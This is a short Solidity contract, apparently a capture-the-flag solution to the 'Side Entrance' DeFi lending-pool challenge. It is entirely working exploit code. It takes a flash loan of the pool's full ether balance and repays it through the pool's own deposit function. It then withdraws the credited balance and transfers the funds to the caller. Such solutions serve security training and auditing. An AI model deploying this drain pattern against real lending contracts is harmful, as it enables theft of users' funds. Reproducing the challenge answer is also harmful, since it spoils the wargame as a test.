// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    receive() external payable {}
}
